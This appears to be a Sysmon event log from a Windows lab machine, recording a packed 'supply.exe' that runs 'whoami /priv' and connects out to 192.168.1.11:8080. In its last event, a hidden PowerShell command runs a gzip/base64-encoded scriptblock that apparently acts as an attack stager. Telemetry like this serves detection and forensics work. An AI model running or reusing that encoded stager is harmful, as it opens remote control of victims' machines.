{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:45.743","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3150-6095-A305-000000001D00","ProcessId":7808,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI78082\\msvcm90.dll","UtcTime":"2021-05-07 12:23:45.743"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2235,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:45.751101Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-314F-6095-A205-000000001D00","ProcessId":2828,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50795,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:23:44.826"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2236,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:45.978388Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:46.149","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3150-6095-A305-000000001D00","ProcessId":7808,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI78082\\msvcp90.dll","UtcTime":"2021-05-07 12:23:46.149"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2237,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:46.160438Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:46.555","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3150-6095-A305-000000001D00","ProcessId":7808,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI78082\\msvcr90.dll","UtcTime":"2021-05-07 12:23:46.555"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2238,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:46.573339Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:46.900","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3150-6095-A305-000000001D00","ProcessId":7808,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI78082\\python27.dll","UtcTime":"2021-05-07 12:23:46.900"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2239,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:46.909053Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3150-6095-A305-000000001D00","ParentProcessId":7808,"ProcessGuid":"747F3D96-3153-6095-A405-000000001D00","ProcessId":7108,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:23:47.899"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2240,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:47.904209Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3153-6095-A405-000000001D00","ParentProcessId":7108,"ProcessGuid":"747F3D96-315B-6095-A505-000000001D00","ProcessId":5112,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:23:55.216"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2241,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:55.219533Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:55.275","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-315B-6095-A505-000000001D00","ProcessId":5112,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI51122\\msvcm90.dll","UtcTime":"2021-05-07 12:23:55.275"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2242,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:55.319513Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:55.290","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-315B-6095-A505-000000001D00","ProcessId":5112,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI51122\\msvcp90.dll","UtcTime":"2021-05-07 12:23:55.290"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2243,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:55.319562Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:55.290","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-315B-6095-A505-000000001D00","ProcessId":5112,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI51122\\msvcr90.dll","UtcTime":"2021-05-07 12:23:55.290"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2244,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:55.319589Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:55.321","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-315B-6095-A505-000000001D00","ProcessId":5112,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI51122\\python27.dll","UtcTime":"2021-05-07 12:23:55.321"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2245,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:55.328264Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-315B-6095-A505-000000001D00","ParentProcessId":5112,"ProcessGuid":"747F3D96-315B-6095-A605-000000001D00","ProcessId":6336,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:23:55.338"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2246,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:55.347646Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-315B-6095-A605-000000001D00","ParentProcessId":6336,"ProcessGuid":"747F3D96-315C-6095-A705-000000001D00","ProcessId":6172,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:23:56.019"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2247,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:56.027252Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:56.057","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-315C-6095-A705-000000001D00","ProcessId":6172,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI61722\\msvcm90.dll","UtcTime":"2021-05-07 12:23:56.057"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2248,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:56.070463Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:56.057","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-315C-6095-A705-000000001D00","ProcessId":6172,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI61722\\msvcp90.dll","UtcTime":"2021-05-07 12:23:56.057"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2249,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:56.070516Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:56.057","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-315C-6095-A705-000000001D00","ProcessId":6172,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI61722\\msvcr90.dll","UtcTime":"2021-05-07 12:23:56.057"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2250,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:56.070546Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:23:56.071","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-315C-6095-A705-000000001D00","ProcessId":6172,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI61722\\python27.dll","UtcTime":"2021-05-07 12:23:56.071"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2251,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:56.089393Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-3153-6095-A405-000000001D00","ProcessId":7108,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50797,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:23:55.160"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2252,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:56.214392Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"whoami /priv\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-315C-6095-A705-000000001D00","ParentProcessId":6172,"ProcessGuid":"747F3D96-315C-6095-A805-000000001D00","ProcessId":6288,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:23:56.193"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2253,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:56.242578Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-315B-6095-A605-000000001D00","ProcessId":6336,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50799,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:23:56.001"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2254,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:23:57.025508Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\Windows\\system32\\cmd.exe","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows Command Processor","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Hashes":"MD5=DB126FF10E71753C0C29210C090927A3,SHA256=B94D1C553C7EF81DF040D6BE59120EB0A8F67AEC1A787A2B6B537309CBAF8CC4,IMPHASH=392B4D61B1D1DADC1F06444DF258188A","Image":"C:\\Windows\\SysWOW64\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"Cmd.Exe","ParentCommandLine":"\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPgilWACA7VW+2+bSBD+OZHyP6DKkkF1DH5cm0SqdAs2No1xcPDbtaoNrPHWC+vCEsft9X+/wYY0VZO79qRDfuxjZnbmm29nWKWRJyiPJNEj0tez0xMHxziU5FJQr0glL3RHpnJyAuslPG9cSO8keYG22xYPMY2WV1dGGsckEsd5tUMEShIS3jFKElmR/pImaxKT85u7T8QT0lep9LHaYfwOs1xsb2BvTaRzFPnZXo97OHOm6m4ZFXL5w4eysjivLavtzylmiVx294kgYdVnrKxI35TswOF+S+SyTb2YJ3wlqhMaNerVUZTgFemDtXtiE7HmflJWIAr4xESkcSQd4skMHLflMgydmHvI92OSJOWKtMhML5bLP+VFfu5tGgkakqoVCRLzrUvie+qRpNrFkc/ILVktQcsVMY2CpaKA2D3fELkUpYxVpN8xI/fJrkDtV5Xkp0og5YhYqUAin4nT5n7KyFGz/IyjkHwFnkcCAHLfzk7PTlcFWTZ32/bHp3SB0cniMCbgnuzwhB4E30laRbLhICx4vIdpaRinRFk+giuVkk+Vl7VrhSgIBuFNSmFtMebUX4JOntAS34+u69nGy8xskRWNSGsf4ZB6Bfnk52AmK0YOQVYLsT64JZfzDeK3CCMBFhlwWbZ/UmuHVDzq6illPomRB6lKwCvIovKjM8dcyGUrskkIGB3nQL/SCihPCumc5vvi9GwOQmWD4SSpSE4Kd86rSC7BjPgVCUUJzbdQKvhhWP7urp0yQT2ciMLcUnkEMj/Q4FEi4tSDvEHwQ3dLPIpZhkVF6lKf6HuXBsXB5WeRMDBjcBXA0j1kAlYyBFyRsSEGHyHzStUlwgq3jIQgcbj7JsMB3PSc7gfy4ID45Z8cLPh8JG+GRQHCE/cgwS7joiKNaSyghmS4Hnj0X45/UjyOjhgxyVMhF1dkoe9FxutS7NsZJXNUDhjEAuI3Yx7qOCFvmsdCIb9Sb6iD4JlZEbP99xtas3bwteE7slcXjtB4SBsWtz0jcTrmBaK7YOdd9JHnv/fJpTtuCrdtCcNB3QHV9Oba07UhjEeWmFmWsDqoO1x7THPaYa9vJQ/qrjvJbB1teM1md6qhRqN509A2ANyM1oIN8vsh3T30YAwV8aanW4muWaz93ri9m9TN+YR11aa5Xk144r6ZtVRVvfRxy94jpHO/Ye+ntVs+7Hqh3oy4emk0N6iNkBG1x6bOr2d6jBx1jIMt310HulEPDISGLiXzwcjUBwNTR6POp8+tSzVQLydTvNYn4zqdb6e3a5ibu+7gWtWalk++8PkOgOtwhINbkAmMurdegUzrNdJf93lSxxudIx1kzPln1FnPtqbDYH84qnM0Zv0pRr353lTV2sxpoq7GJ50ADUAcB/oAo+S+9aWl1sY+9yd/9GcrdTxlb9WWMXDW0yxmdRtmv7tu69qb13bezduL3oSOQ45Gqjp+lXEGSFP6Ej5hwkt13MZxssYMGAIFuriWJo/NvOY6nGYaspw16g2JI8Kgz0EnLKiNGONeVvGPxRnazbEJZD1pBMNG/dmRIj0KKt9bQbF0dTUHL+GyAJ2rPRIFYl3RHhqaBmVde2hqEOKvB2bw7V7OLFWyrgCw5HbZwa6SXZ8Ss1f/K1j5lV3Dn/+vYH1f+4fdXwJQq2Th/rT448Jvgfm7gU8wFSDoQslh5NjzXog/58WT9wJICmR9lT/Ze91NKs778LZwdvo3FKWIS0EKAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))","ParentImage":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ParentProcessGuid":"747F3D96-308D-6095-D004-000000001D00","ParentProcessId":2552,"ProcessGuid":"747F3D96-3246-6095-B205-000000001D00","ProcessId":7152,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:27:50.405"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2255,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:27:50.409279Z"}},"Version":5}}
